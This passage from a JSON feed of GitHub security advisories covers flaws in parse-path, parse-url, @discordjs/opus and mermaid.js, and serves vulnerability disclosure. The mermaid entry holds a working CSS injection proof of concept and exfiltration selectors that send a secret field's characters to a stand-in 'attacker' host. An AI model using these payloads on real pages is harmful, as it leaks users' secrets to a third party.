            "date_modified": "2022-07-05T22:56:59.000Z",
            "date_published": "2022-07-05T22:56:58.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-ffmh-x56j-9rc3"
            }
        },
        {
            "content_html": "<p>Authorization Bypass Through User-Controlled Key in GitHub repository ionicabizau/parse-path prior to 5.0.0.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2022-0624\">https://nvd.nist.gov/vuln/detail/CVE-2022-0624</a></li>\n<li><a href=\"https://github.com/ionicabizau/parse-path/commit/f9ad8856a3c8ae18e1cf4caef5edbabbc42840e8\">https://github.com/ionicabizau/parse-path/commit/f9ad8856a3c8ae18e1cf4caef5edbabbc42840e8</a></li>\n<li><a href=\"https://huntr.dev/bounties/afffb2bd-fb06-4144-829e-ecbbcbc85388\">https://huntr.dev/bounties/afffb2bd-fb06-4144-829e-ecbbcbc85388</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-3j8f-xvm3-ffx4\">https://github.com/advisories/GHSA-3j8f-xvm3-ffx4</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-3j8f-xvm3-ffx4",
            "title": "[parse-path] Authorization Bypass in parse-path",
            "date_modified": "2022-07-08T17:05:51.000Z",
            "date_published": "2022-06-29T00:00:57.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-3j8f-xvm3-ffx4"
            }
        },
        {
            "content_html": "<p>Cross-site Scripting (XSS) - Generic in GitHub repository ionicabizau/parse-url prior to 6.0.1</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2022-2217\">https://nvd.nist.gov/vuln/detail/CVE-2022-2217</a></li>\n<li><a href=\"https://github.com/ionicabizau/parse-url/commit/21c72ab9412228eea753e2abc48f8962707b1fe3\">https://github.com/ionicabizau/parse-url/commit/21c72ab9412228eea753e2abc48f8962707b1fe3</a></li>\n<li><a href=\"https://huntr.dev/bounties/4e046c63-b1ca-4bcc-b418-29796918a71b\">https://huntr.dev/bounties/4e046c63-b1ca-4bcc-b418-29796918a71b</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-q6wq-5p59-983w\">https://github.com/advisories/GHSA-q6wq-5p59-983w</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-q6wq-5p59-983w",
            "title": "[parse-url] Cross site scripting in parse-url",
            "date_modified": "2022-07-07T17:15:33.000Z",
            "date_published": "2022-06-28T00:01:02.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-q6wq-5p59-983w"
            }
        },
        {
            "content_html": "<p>Server-Side Request Forgery (SSRF) in GitHub repository ionicabizau/parse-url prior to 7.0.0.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2022-2216\">https://nvd.nist.gov/vuln/detail/CVE-2022-2216</a></li>\n<li><a href=\"https://github.com/ionicabizau/parse-url/commit/21c72ab9412228eea753e2abc48f8962707b1fe3\">https://github.com/ionicabizau/parse-url/commit/21c72ab9412228eea753e2abc48f8962707b1fe3</a></li>\n<li><a href=\"https://huntr.dev/bounties/505a3d39-2723-4a06-b1f7-9b2d133c92e1\">https://huntr.dev/bounties/505a3d39-2723-4a06-b1f7-9b2d133c92e1</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-7f3x-x4pr-wqhj\">https://github.com/advisories/GHSA-7f3x-x4pr-wqhj</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-7f3x-x4pr-wqhj",
            "title": "[parse-url] Server-Side Request Forgery in parse-url",
            "date_modified": "2022-07-07T17:15:42.000Z",
            "date_published": "2022-06-28T00:01:02.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-7f3x-x4pr-wqhj"
            }
        },
        {
            "content_html": "<p>Cross-site Scripting (XSS) - Stored in GitHub repository ionicabizau/parse-url prior to 7.0.0.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2022-2218\">https://nvd.nist.gov/vuln/detail/CVE-2022-2218</a></li>\n<li><a href=\"https://github.com/ionicabizau/parse-url/commit/21c72ab9412228eea753e2abc48f8962707b1fe3\">https://github.com/ionicabizau/parse-url/commit/21c72ab9412228eea753e2abc48f8962707b1fe3</a></li>\n<li><a href=\"https://huntr.dev/bounties/024912d3-f103-4daf-a1d0-567f4d9f2bf5\">https://huntr.dev/bounties/024912d3-f103-4daf-a1d0-567f4d9f2bf5</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-jpp7-7chh-cf67\">https://github.com/advisories/GHSA-jpp7-7chh-cf67</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-jpp7-7chh-cf67",
            "title": "[parse-url] Cross site scripting in parse-url",
            "date_modified": "2022-07-07T17:16:00.000Z",
            "date_published": "2022-06-28T00:01:01.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-jpp7-7chh-cf67"
            }
        },
        {
            "content_html": "<p>Exposure of Sensitive Information to an Unauthorized Actor via hostname confusion in GitHub repository ionicabizau/parse-url prior to 6.0.1</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2022-0722\">https://nvd.nist.gov/vuln/detail/CVE-2022-0722</a></li>\n<li><a href=\"https://github.com/ionicabizau/parse-url/commit/21c72ab9412228eea753e2abc48f8962707b1fe3\">https://github.com/ionicabizau/parse-url/commit/21c72ab9412228eea753e2abc48f8962707b1fe3</a></li>\n<li><a href=\"https://huntr.dev/bounties/2490ef6d-5577-4714-a4dd-9608251b4226\">https://huntr.dev/bounties/2490ef6d-5577-4714-a4dd-9608251b4226</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-4p35-cfcx-8653\">https://github.com/advisories/GHSA-4p35-cfcx-8653</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-4p35-cfcx-8653",
            "title": "[parse-url] Hostname confusion in parse-url",
            "date_modified": "2022-07-07T17:15:51.000Z",
            "date_published": "2022-06-28T00:01:01.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-4p35-cfcx-8653"
            }
        },
        {
            "content_html": "<p>Improperly handled errors in @discordjs/opus cause hard crashes instead of returning the error to user land.\", \"details\": \"All versions of package @discordjs/opus (&lt;= 0.7.0) are vulnerable to Denial of Service (DoS) when trying to encode using an encoder with zero channels, or a non-initialized buffer. This leads to a hard crash due to improperly returning the errors from the invalid inputs.</p>\n<p>As of version 0.8.0, the errors are correctly returned to the user and are no longer throwing hard crashes that cannot be recovered.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2022-25345\">https://nvd.nist.gov/vuln/detail/CVE-2022-25345</a></li>\n<li><a href=\"https://snyk.io/vuln/SNYK-JS-DISCORDJSOPUS-2403100\">https://snyk.io/vuln/SNYK-JS-DISCORDJSOPUS-2403100</a></li>\n<li><a href=\"https://github.com/discordjs/opus/blob/3ca4341ffdd81cf83cec57045e59e228e6017590/src/node-opus.cc#L28\">https://github.com/discordjs/opus/blob/3ca4341ffdd81cf83cec57045e59e228e6017590/src/node-opus.cc#L28</a></li>\n<li><a href=\"https://github.com/discordjs/opus/commit/406249f3fca484a2af97a34ceb989019efa09bc7\">https://github.com/discordjs/opus/commit/406249f3fca484a2af97a34ceb989019efa09bc7</a></li>\n<li><a href=\"https://github.com/discordjs/opus/releases/tag/v0.8.0\">https://github.com/discordjs/opus/releases/tag/v0.8.0</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-rvgf-69j7-xh78\">https://github.com/advisories/GHSA-rvgf-69j7-xh78</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-rvgf-69j7-xh78",
            "title": "[@discordjs/opus] Uncontrolled Resource Consumption in @discordjs/opus",
            "date_modified": "2022-07-05T21:23:17.000Z",
            "date_published": "2022-06-18T00:00:20.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-rvgf-69j7-xh78"
            }
        },
        {
            "content_html": "<p>An attacker is able to inject arbitrary <code>CSS</code> into the generated graph allowing them to change the styling of elements outside of the generated graph, and potentially exfiltrate sensitive information by using specially crafted <code>CSS</code> selectors.</p>\n<p>The following example shows how an attacker can exfiltrate the contents of an input field by bruteforcing the <code>value</code> attribute one character at a time. Whenever there is an actual match, an <code>http</code> request will be made by the browser in order to \"load\" a background image that will let an attacker know what's the value of the character.</p>\n<pre><code class=\"language-css\">input[name=secret][value^=g] { background-image: url(http://attacker/?char=g); }\n...\ninput[name=secret][value^=go] { background-image: url(http://attacker/?char=o); }\n...\ninput[name=secret][value^=goo] { background-image: url(http://attacker/?char=o); }\n...\ninput[name=secret][value^=goos] { background-image: url(http://attacker/?char=s); }\n...\ninput[name=secret][value^=goose] { background-image: url(http://attacker/?char=e); }\n</code></pre>\n<h3 id=\"patches\">Patches</h3>\n<p><em>Has the problem been patched? What versions should users upgrade to?</em></p>\n<h3 id=\"workarounds\">Workarounds</h3>\n<p><em>Is there a way for users to fix or remediate the vulnerability without upgrading?</em></p>\n<h3 id=\"references\">References</h3>\n<p><em>Are there any links users can visit to find out more?</em></p>\n<h3 id=\"for-more-information\">For more information</h3>\n<p>If you have any questions or comments about this advisory:</p>\n<ul>\n<li>Open an issue in <a href=\"http://example.com\">example link to repo</a></li>\n<li>Email us at <a href=\"mailto:example@example.com\">example email address</a></li>\n</ul>\n<h2 id=\"product\">Product</h2>\n<p>mermaid.js</p>\n<h2 id=\"tested-version\">Tested Version</h2>\n<p><a href=\"https://github.com/mermaid-js/mermaid/releases/tag/9.1.1\">v9.1.1</a></p>\n<h2 id=\"details\">Details</h2>\n<h3 id=\"issue-1-multiple-css-injection-ghsl-2022-036\">Issue 1: Multiple CSS Injection (<code>GHSL-2022-036</code>)</h3>\n<p>By supplying a carefully crafted <code>textColor</code> theme variable, an attacker can inject arbitrary <code>CSS</code> rules into the document. In the following snippet we can see that <code>getStyles</code> does not sanitize any of the theme variables leaving the door open for <code>CSS</code> injection.</p>\n<p><em>Snippet from <a href=\"https://github.com/mermaid-js/mermaid/blob/9eae97ddab1b6eca58d2fd4af62357d2f4d8d1f7/src/styles.js#L35\">src/styles.js</a>:</em></p>\n<pre><code class=\"language-js\">const getStyles = (type, userStyles, options) =&gt; {\n  return ` {\n    font-family: ${options.fontFamily};\n    font-size: ${options.fontSize};\n    fill: ${options.textColor}\n  }\n</code></pre>\n<p>For example, if we set <code>textColor</code> to <code>\"green;} #target { background-color: crimson }\"</code> the resulting <code>CSS</code> will contain a new selector <code>#target</code> that will apply a <code>crimson</code> background color to an arbitrary element.</p>\n<pre><code class=\"language-html\">&lt;html&gt;\n\n&lt;body&gt;\n    &lt;div id=\"target\"&gt;\n        &lt;h1&gt;This element does not belong to the SVG but we can style it&lt;/h1&gt;\n    &lt;/div&gt;\n    &lt;svg id=\"diagram\"&gt;\n    &lt;/svg&gt;\n\n    &lt;script src=\"https://cdn.jsdelivr.net/npm/mermaid/dist/mermaid.min.js\"&gt;&lt;/script&gt;\n    &lt;script&gt;\n        mermaid.initialize({ startOnLoad: false });\n\n        const graph =\n            `\n            %%{ init: { \"themeVariables\" : { \"textColor\": \"green;} #target { background-color: crimson }\" } } }%%\n            graph TD\n                A[Goose]\n            `\n\n        const diagram = document.getElementById(\"diagram\")\n        const svg = mermaid.render('diagram-svg', graph)\n        diagram.innerHTML = svg\n    &lt;/script&gt;\n&lt;/body&gt;\n\n&lt;/html&gt;\n</code></pre>\n<p>In the proof of concept above we used the <code>textColor</code> variable to inject <code>CSS</code>, but there are multiple functions that can potentially be abused to change the style of the document. Some of them are in the following list but we encourage mantainers to look for additional injection points:</p>\n<ul>\n<li><a href=\"https://github.com/mermaid-js/mermaid/blob/5d30d465354f804e361d7a041ec46da6bb5d583b/src/mermaidAPI.js#L393\">https://github.com/mermaid-js/mermaid/blob/5d30d465354f804e361d7a041ec46da6bb5d583b/src/mermaidAPI.js#L393</a></li>\n<li><a href=\"https://github.com/mermaid-js/mermaid/blob/5d30d465354f804e361d7a041ec46da6bb5d583b/src/styles.js#L35\">https://github.com/mermaid-js/mermaid/blob/5d30d465354f804e361d7a041ec46da6bb5d583b/src/styles.js#L35</a></li>\n</ul>\n<h4 id=\"impact\">Impact</h4>\n<p>This issue may lead to <code>Information Disclosure</code> via CSS selectors and functions able to generate HTTP requests. This also allows an attacker to change the document in ways which may lead a user to perform unintended actions, such as clicking on a link, etc.</p>\n<h4 id=\"remediation\">Remediation</h4>\n<p>Ensure that user input is adequately escaped before embedding it in CSS blocks.</p>\n<h3 id=\"references-1\">References</h3>\n<ul>\n<li><a href=\"https://github.com/mermaid-js/mermaid/security/advisories/GHSA-x3vm-38hw-55wf\">https://github.com/mermaid-js/mermaid/security/advisories/GHSA-x3vm-38hw-55wf</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2022-31108\">https://nvd.nist.gov/vuln/detail/CVE-2022-31108</a></li>\n<li><a href=\"https://github.com/mermaid-js/mermaid/commit/0ae1bdb61adff1cd485caff8c62ec6b8ac57b225\">https://github.com/mermaid-js/mermaid/commit/0ae1bdb61adff1cd485caff8c62ec6b8ac57b225</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-x3vm-38hw-55wf\">https://github.com/advisories/GHSA-x3vm-38hw-55wf</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-x3vm-38hw-55wf",
            "title": "[mermaid] Possible inject arbitrary `CSS` into the generated graph affecting the container HTML",
            "date_modified": "2022-07-05T18:29:36.000Z",
            "date_published": "2022-07-05T18:29:31.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-x3vm-38hw-55wf"
            }
        }
    ]
}